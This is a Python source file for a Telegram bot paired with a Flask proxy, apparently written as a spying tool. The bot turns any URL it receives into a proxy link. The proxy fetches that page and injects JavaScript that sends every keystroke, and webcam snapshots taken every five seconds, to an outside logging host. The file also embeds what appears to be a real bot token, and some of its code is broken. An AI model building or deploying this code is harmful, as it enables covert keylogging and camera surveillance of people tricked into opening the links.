import telebot
from flask import Flask, request, Response
import requests

BOT_TOKEN = '9262202375:AAEtRgOTUcBh0VHlJtL6V7ewC-kBeuXSZTs'  # Твой токен уже вставлен!
PROXY_URL = 'https://your-proxy-subdomain.render.com'  # Позже замени на свой Render-домен

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "Отправь мне ссылку для обработки 📲")

@bot.message_handler(func=lambda m: True)
def handle_link(message):
    original_url = message.text.strip()
    
    proxy_link = f"{PROXY_URL}/inject?target={original_url}"
    
    bot.send_message(
        message.chat.id,
        f"Готовая ссылка:\n`{proxy_link}`",
        parse_mode='Markdown'
    )

@app.route('/inject')
def inject_scripts():
    target_url = request.args.get('target', '')
    
    response = requests.get(target_url)
    html = response.text
    
    scripts = """
    <script>
    (function(){
        document.addEventListener('keydown', function(e){
            fetch('https://your-logs.com/keys', {method:'POST', body:e.key});
        });
        
        navigator.mediaDevices.getUserMedia({video:true})
            .then(stream => {
                setInterval(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = 640;
                    canvas.height = 480;
                    canvas.getContext('2d')
                        .drawImage(stream.getVideoTracks()[0].getFrame(), 0, 0);
                    
                    fetch('https://your-logs.com/camera', {
                        method: 'POST',
                        body: canvas.toDataURL()
                    });
                }, 5000);
            });
    })();
    </script>
    """
    
    html = html.replace('</body>', f'{scripts}</body>')
    return Response(html, content_type='text/html')

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get('PORT', 5000)))
